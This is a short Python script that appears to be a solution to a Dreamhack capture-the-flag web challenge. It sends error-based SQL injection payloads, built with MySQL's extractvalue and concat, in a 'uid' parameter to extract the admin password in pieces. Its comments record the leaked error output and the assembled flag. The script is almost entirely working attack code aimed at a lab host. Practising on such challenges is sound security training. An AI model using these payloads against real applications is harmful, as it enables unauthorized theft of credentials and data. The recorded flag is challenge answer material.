import requests

url = 'http://host8.dreamhack.games:14574'

# payload = f"' AND extractvalue(1, concat(':', (SELECT length(upw) FROM user WHERE uid='admin')))-- -"

# payload = f"' AND extractvalue(1, concat(':', (SELECT substr(upw, 1, 30) FROM user WHERE uid='admin')))-- -"
# (1105, "XPATH syntax error: ':DH{c3968c78840750168774ad951fc'")

payload = f"' AND extractvalue(1, concat(':', (SELECT substr(upw, 31, 14) FROM user WHERE uid='admin')))-- -"
# (1105, "XPATH syntax error: ':98bf788563c4d}'")

# DH{c3968c78840750168774ad951fc98bf788563c4d}

r = requests.get(url, params={'uid': payload})

print(r.text)